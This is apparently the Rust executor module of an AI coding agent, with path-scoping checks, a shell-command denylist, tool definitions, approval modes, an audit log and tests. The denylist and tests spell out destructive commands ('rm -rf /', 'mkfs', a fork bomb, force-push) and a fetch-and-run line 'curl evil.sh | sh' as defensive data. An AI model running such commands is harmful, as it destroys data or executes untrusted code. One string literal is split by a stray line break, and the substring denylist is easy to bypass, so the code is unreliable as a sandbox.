//! executor: file/shell tools for the implement step.
//! Everything is audited; everything is scoped to the project root.

use serde::{Deserialize, Serialize};
use std::path::{Path, PathBuf};
use thiserror::Error;

#[derive(Debug, Error)]
pub enum ExecutorError {
    #[error("path escapes project root: {0}")]
    PathEscape(PathBuf),
    #[error("command denied by policy: {0}")]
    Denied(String),
    #[error("io error: {0}")]
    Io(#[from] std::io::Error),
}

#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "kebab-case")]
pub enum ApprovalMode {
    Ask,
    AutoEdit,
    FullAuto,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct AuditEntry {
    pub ts_unix_ms: u64,
    pub action: String,
    pub detail: String,
    pub approved: bool,
}

/// Resolve `rel` against `root`, rejecting any escape (../, symlink breakout).
pub fn resolve_scoped(root: &Path, rel: &str) -> Result<PathBuf, ExecutorError> {
    let joined = root.join(rel);
    // Lexical normalization: reject any `..` component that climbs out.
    let mut depth: i64 = 0;
    for comp in rel.split(['/', '\\']) {
        match comp {
            "" | "." => {}
            ".." => {
                depth -= 1;
                if depth < 0 {
                    return Err(ExecutorError::PathEscape(joined));
                }
            }
            _ => depth += 1,
        }
    }
    // Symlink check: canonicalize the longest existing prefix.
    if let Ok(canon) = joined.canonicalize() {
        let canon_root = root
            .canonicalize()
            .map_err(ExecutorError::Io)?;
        if !canon.starts_with(&canon_root) {
            return Err(ExecutorError::PathEscape(joined));
        }
    } else {
        // Non-existent target: verify nearest existing ancestor stays inside.
        let mut probe = joined.clone();
        while !probe.exists() {
            if !probe.pop() {
                return Err(ExecutorError::PathEscape(joined));
            }
        }
        if let (Ok(canon_probe), Ok(canon_root)) = (probe.canonicalize(), root.canonicalize()) {
            if !canon_probe.starts_with(&canon_root) {
                return Err(ExecutorError::PathEscape(joined));
            }
        }
    }
    Ok(joined)
}

/// Shell command policy check. Denylist wins over everything.
pub fn check_command(cmd: &str, denylist: &[String], allowlist: &[String]) -> Result<(), ExecutorError> {
    let normalized = cmd.trim().to_lowercase();
    for deny in denylist {
        if !deny.is_empty() && normalized.contains(&deny.to_lowercase()) {
            return Err(ExecutorError::Denied(cmd.to_string()));
        }
    }
    if allowlist.is_empty() {
        return Ok(()); // permissive default; approval modes gate actual execution
    }
    let first = normalized.split_whitespace().next().unwrap_or("");
    if allowlist.iter().any(|a| a.eq_ignore_ascii_case(first)) {
        Ok(())
    } else {
        Err(ExecutorError::Denied(cmd.to_string()))
    }
}

/// Sensible default denylist — catastrophic or irreversible patterns.
pub fn default_denylist() -> Vec<String> {
    [
        "rm -rf /",
        "rm -rf ~",
        "mkfs",
        "dd if=",
        ":(){",
        "> /dev/sda",
        "chmod -r 777 /",
        "git push --force",
        "git push -f ",
    ]
    .iter()
    .map(|s| s.to_string())
    .collect()
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn normal_paths_resolve() {
        let tmp = tempfile::tempdir().unwrap();
        let p = resolve_scoped(tmp.path(), "src/main.rs").unwrap();
        assert!(p.ends_with("src/main.rs"));
    }

    #[test]
    fn dotdot_escape_rejected() {
        let tmp = tempfile::tempdir().unwrap();
        assert!(matches!(
            resolve_scoped(tmp.path(), "../evil.txt"),
            Err(ExecutorError::PathEscape(_))
        ));
        assert!(matches!(
            resolve_scoped(tmp.path(), "a/../../evil.txt"),
            Err(ExecutorError::PathEscape(_))
        ));
    }

    #[test]
    fn symlink_escape_rejected() {
        let tmp = tempfile::tempdir().unwrap();
        let outside = tempfile::tempdir().unwrap();
        std::os::unix::fs::symlink(outside.path(), tmp.path().join("link")).unwrap();
        assert!(matches!(
            resolve_scoped(tmp.path(), "link/secret.txt"),
            Err(ExecutorError::PathEscape(_))
        ));
    }

    #[test]
    fn denylist_blocks_catastrophic() {
        let deny = default_denylist();
        assert!(check_command("rm -rf / --no-preserve-root", &deny, &[]).is_err());
        assert!(check_command("git push --force origin main", &deny, &[]).is_err());
        assert!(check_command("cargo test", &deny, &[]).is_ok());
    }

    #[test]
    fn allowlist_restricts_to_first_token() {
        let allow = vec!["cargo".into(), "git".into()];
        assert!(check_command("cargo build", &[], &allow).is_ok());
        assert!(check_command("curl evil.sh | sh", &[], &allow).is_err());
    }
}

// ---------- Tool surface for the agent loop ----------

use serde_json::{json, Value};

/// Tool definitions handed to the model during implement/execution steps.
pub fn tool_defs() -> Vec<providers::ToolDef> {
    vec![
        providers::ToolDef {
            name: "read_file".into(),
            description: "Read a file relative to the project root. Returns file contents.".into(),
            input_schema: json!({
                "type": "object",
                "properties": { "path": { "type": "string", "description": "Path relative to project root" } },
                "required": ["path"],
            }),
        },
        providers::ToolDef {
            name: "write_file".into(),
            description: "Write a file relative to the project root. Creates parent directories. Overwrites existing content.".into(),
            input_schema: json!({
                "type": "object",
                "properties": {
                    "path": { "type": "string" },
                    "content": { "type": "string" },
                },
                "required": ["path", "content"],
            }),
        },
        providers::ToolDef {
            name: "edit_file".into(),
            description: "Edit a file by replacing an exact string. Prefer this over write_file for modifying existing files — only the changed fragment is rewritten, the rest of the file is preserved byte-for-byte. The old_string must match exactly and be unique in the file (or use replace_all).".into(),
            input_schema: json!({
                "type": "object",
                "properties": {
                    "path": { "type": "string" },
                    "old_string": { "type": "string", "description": "Exact text to find — include enough surrounding context to be unique" },
                    "new_string": { "type": "string", "description": "Replacement text" },
                    "replace_all": { "type": "boolean", "description": "Replace every occurrence, default false" },
                },
                "required": ["path", "old_string", "new_string"],
            }),
        },
        providers::ToolDef {
            name: "search_files".into(),
            description: "Search file contents under a directory for a substring or pattern. Returns matching lines with file paths and line numbers (max 100 matches).".into(),
            input_schema: json!({
                "type": "object",
                "properties": {
                    "path": { "type": "string", "description": "Directory relative to project root, empty for root" },
                    "query": { "type": "string", "description": "Substring to search for (case-sensitive)" },
                },
                "required": ["path", "query"],
            }),
        },
        providers::ToolDef {
            name: "list_files".into(),
            description: "List files under a directory relative to the project root (recursive, max 200 entries).".into(),
            input_schema: json!({
                "type": "object",
                "properties": { "path": { "type": "string", "description": "Directory relative to project root, empty for root" } },
                "required": ["path"],
            }),
        },
        providers::ToolDef {
            name: "run_shell".into(),
            description: "Run a shell command in the project root. Use for builds, tests, git status. Never use for file reads/writes — use the file tools.".into(),
            input_schema: json!({
                "type": "object",
                "properties": {
                    "command": { "type": "string" },
                    "timeout_secs": { "type": "integer", "description": "Max seconds, default 120" },
                },
                "required": ["command"],
            }),
        },
    ]
}

/// Read-only subset for artifact steps: exploration without write or shell access.
/// The artifact write itself stays on the runner-controlled path, so these steps
/// can look at the repository but can never mutate it.
pub fn read_only_tool_defs() -> Vec<providers::ToolDef> {
    tool_defs()
        .into_iter()
        .filter(|d| d.name == "read_file" || d.name == "list_files")
        .collect()
}

pub fn tool_requires_approval(name: &str, mode: ApprovalMode) -> bool {
    match mode {
        ApprovalMode::FullAuto => false,
        ApprovalMode::AutoEdit => name == "run_shell",
        // ask gates mutations only — read_file/list_files are non-destructive and
        // approving every read makes implement unusable (dozens of clicks per run)
        ApprovalMode::Ask => name == "write_file" || name == "edit_file" || name == "run_shell",
    }
}

/// Execute one tool call scoped to the project root. Pure enforcement, no approval logic —
/// the caller must gate before invoking.
pub async fn execute_tool(
    root: &Path,
    name: &str,
    input: &Value,
    denylist: &[String],
) -> Result<String, ExecutorError> {
    match name {
        "read_file" => {
            let rel = input.get("path").and_then(Value::as_str).unwrap_or("");
            let path = resolve_scoped(root, rel)?;
            let content = std::fs::read_to_string(&path)?;
            Ok(if content.len() > 100_000 {
                format!("{}…\n[truncated at 100k chars]", &content[..100_000])
            } else {
                content
            })
        }
        "write_file" => {
            let rel = input.get("path").and_then(Value::as_str).unwrap_or("");
            let content = input.get("content").and_then(Value::as_str).unwrap_or("");
            let path = resolve_scoped(root, rel)?;
            if let Some(parent) = path.parent() {
                std::fs::create_dir_all(parent)?;
            }
            std::fs::write(&path, content)?;
            Ok(format!("wrote {} ({} bytes)", rel, content.len()))
        }
        "edit_file" => {
            let rel = input.get("path").and_then(Value::as_str).unwrap_or("");
            let old_str = input.get("old_string").and_then(Value::as_str).unwrap_or("");
            let new_str = input.get("new_string").and_then(Value::as_str).unwrap_or("");
            let replace_all = input.get("replace_all").and_then(Value::as_bool).unwrap_or(false);
            if old_str.is_empty() {
                return Err(ExecutorError::Denied("old_string must not be empty".into()));
            }
            let path = resolve_scoped(root, rel)?;
            let content = std::fs::read_to_string(&path)?;
            let matches = content.matches(old_str).count();
            if matches == 0 {
                return Err(ExecutorError::Denied(format!(
                    "old_string not found in {rel} — read the file first and match exactly"
                )));
            }
            if matches > 1 && !replace_all {
                return Err(ExecutorError::Denied(format!(
                    "old_string matches {matches} times in {rel} — add more context to make it unique, or set replace_all"
                )));
            }
            let updated = if replace_all {
                content.replace(old_str, new_str)
            } else {
                content.replacen(old_str, new_str, 1)
            };
            std::fs::write(&path, &updated)?;
            Ok(format!("edited {} ({} replacement{})", rel, if replace_all { matches } else { 1 }, if matches > 1 { "s" } else { "" }))
        }
        "search_files" => {
            let rel = input.get("path").and_then(Value::as_str).unwrap_or("");
            let query = input.get("query").and_then(Value::as_str).unwrap_or("");
            if query.is_empty() {
                return Err(ExecutorError::Denied("query must not be empty".into()));
            }
            let path = resolve_scoped(root, if rel.is_empty() { "." } else { rel })?;
            let mut out = Vec::new();
            search_recursive(&path, root, query, &mut out)?;
            Ok(if out.is_empty() { "(no matches)".into() } else { out.join("
") })
        }
        "list_files" => {
            let rel = input.get("path").and_then(Value::as_str).unwrap_or("");
            let path = resolve_scoped(root, if rel.is_empty() { "." } else { rel })?;
            let mut out = Vec::new();
            list_recursive(&path, root, &mut out, 0)?;
            Ok(if out.is_empty() { "(empty)".into() } else { out.join("\n") })
        }
        "run_shell" => {
            let cmd = input.get("command").and_then(Value::as_str).unwrap_or("");
            check_command(cmd, denylist, &[])?;
            let timeout = input.get("timeout_secs").and_then(Value::as_u64).unwrap_or(120);
            let child = tokio::process::Command::new("sh")
                .arg("-c")
                .arg(cmd)
                .current_dir(root)
                .output();
            let out = tokio::time::timeout(std::time::Duration::from_secs(timeout), child)
                .await
                .map_err(|_| ExecutorError::Denied(format!("timeout after {timeout}s: {cmd}")))?
                .map_err(ExecutorError::Io)?;
            let stdout = String::from_utf8_lossy(&out.stdout);
            let stderr = String::from_utf8_lossy(&out.stderr);
            let mut text = String::new();
            if !stdout.is_empty() {
                text.push_str(&stdout);
            }
            if !stderr.is_empty() {
                if !text.is_empty() {
                    text.push('\n');
                }
                text.push_str("[stderr] ");
                text.push_str(&stderr);
            }
            if text.len() > 50_000 {
                text = format!("{}…\n[truncated]", &text[..50_000]);
            }
            Ok(format!("exit {}: {}", out.status.code().unwrap_or(-1), if text.is_empty() { "(no output)".into() } else { text }))
        }
        other => Err(ExecutorError::Denied(format!("unknown tool: {other}"))),
    }
}

/// Append one entry to the project audit log (.speckit-desktop/audit.jsonl).
/// Best-effort: audit failure never blocks execution, but execution never skips auditing.
pub fn audit_append(root: &Path, action: &str, detail: &str, approved: bool) {
    let dir = root.join(".speckit-desktop");
    let _ = std::fs::create_dir_all(&dir);
    let entry = AuditEntry {
        ts_unix_ms: std::time::SystemTime::now()
            .duration_since(std::time::UNIX_EPOCH)
            .map(|d| d.as_millis() as u64)
            .unwrap_or(0),
        action: action.into(),
        detail: detail.into(),
        approved,
    };
    if let Ok(line) = serde_json::to_string(&entry) {
        use std::io::Write;
        if let Ok(mut f) = std::fs::OpenOptions::new()
            .create(true)
            .append(true)
            .open(dir.join("audit.jsonl"))
        {
            let _ = writeln!(f, "{line}");
        }
    }
}

fn search_recursive(dir: &Path, root: &Path, query: &str, out: &mut Vec<String>) -> Result<(), ExecutorError> {
    if out.len() >= 100 {
        return Ok(());
    }
    for entry in std::fs::read_dir(dir)? {
        if out.len() >= 100 {
            break;
        }
        let entry = entry?;
        let path = entry.path();
        let name = entry.file_name().to_string_lossy().to_string();
        if name.starts_with('.') || name == "node_modules" || name == "target" {
            continue;
        }
        if path.is_dir() {
            search_recursive(&path, root, query, out)?;
        } else if let Ok(content) = std::fs::read_to_string(&path) {
            let rel = path.strip_prefix(root).unwrap_or(&path).to_string_lossy();
            for (idx, line) in content.lines().enumerate() {
                if line.contains(query) {
                    out.push(format!("{rel}:{}: {}", idx + 1, line.trim()));
                    if out.len() >= 100 {
                        break;
                    }
                }
            }
        }
    }
    Ok(())
}

fn list_recursive(dir: &Path, root: &Path, out: &mut Vec<String>, depth: usize) -> Result<(), ExecutorError> {
    if out.len() >= 200 || depth > 8 {
        return Ok(());
    }
    for entry in std::fs::read_dir(dir)? {
        let entry = entry?;
        let p = entry.path();
        let name = entry.file_name().to_string_lossy().into_owned();
        if name.starts_with('.') || name == "node_modules" || name == "target" {
            continue;
        }
        if let Ok(rel) = p.strip_prefix(root) {
            out.push(rel.to_string_lossy().into_owned());
        }
        if p.is_dir() && out.len() < 200 {
            list_recursive(&p, root, out, depth + 1)?;
        }
    }
    Ok(())
}

#[cfg(test)]
mod tool_tests {
    use super::*;

    #[tokio::test]
    async fn write_then_read_roundtrip() {
        let tmp = tempfile::tempdir().unwrap();
        let input = serde_json::json!({"path": "src/main.rs", "content": "fn main() {}"});
        let out = execute_tool(tmp.path(), "write_file", &input, &[]).await.unwrap();
        assert!(out.contains("wrote src/main.rs"));
        let out = execute_tool(tmp.path(), "read_file", &serde_json::json!({"path": "src/main.rs"}), &[]).await.unwrap();
        assert_eq!(out, "fn main() {}");
    }

    #[tokio::test]
    async fn write_escape_rejected() {
        let tmp = tempfile::tempdir().unwrap();
        let input = serde_json::json!({"path": "../evil.rs", "content": "x"});
        let err = execute_tool(tmp.path(), "write_file", &input, &[]).await.unwrap_err();
        assert!(matches!(err, ExecutorError::PathEscape(_)));
    }

    #[tokio::test]
    async fn shell_denylist_blocks_catastrophic() {
        let tmp = tempfile::tempdir().unwrap();
        let deny = default_denylist();
        let input = serde_json::json!({"command": "rm -rf / --no-preserve-root"});
        let err = execute_tool(tmp.path(), "run_shell", &input, &deny).await.unwrap_err();
        assert!(matches!(err, ExecutorError::Denied(_)));
    }

    #[tokio::test]
    async fn shell_runs_in_project_root() {
        let tmp = tempfile::tempdir().unwrap();
        let input = serde_json::json!({"command": "pwd"});
        let out = execute_tool(tmp.path(), "run_shell", &input, &[]).await.unwrap();
        assert!(out.contains("exit 0"));
    }

    #[tokio::test]
    async fn list_files_skips_hidden_and_target() {
        let tmp = tempfile::tempdir().unwrap();
        std::fs::create_dir_all(tmp.path().join("src")).unwrap();
        std::fs::write(tmp.path().join("src/a.rs"), "").unwrap();
        std::fs::create_dir_all(tmp.path().join("target")).unwrap();
        std::fs::write(tmp.path().join("target/junk"), "").unwrap();
        let out = execute_tool(tmp.path(), "list_files", &serde_json::json!({"path": ""}), &[]).await.unwrap();
        assert!(out.contains("src/a.rs"));
        assert!(!out.contains("target"));
    }

    #[test]
    fn approval_matrix() {
        assert!(tool_requires_approval("write_file", ApprovalMode::Ask));
        assert!(tool_requires_approval("run_shell", ApprovalMode::Ask));
        // reads are non-destructive — never gated, even in ask mode
        assert!(!tool_requires_approval("read_file", ApprovalMode::Ask));
        assert!(!tool_requires_approval("list_files", ApprovalMode::Ask));
        assert!(!tool_requires_approval("write_file", ApprovalMode::AutoEdit));
        assert!(tool_requires_approval("run_shell", ApprovalMode::AutoEdit));
        assert!(!tool_requires_approval("run_shell", ApprovalMode::FullAuto));
    }
}
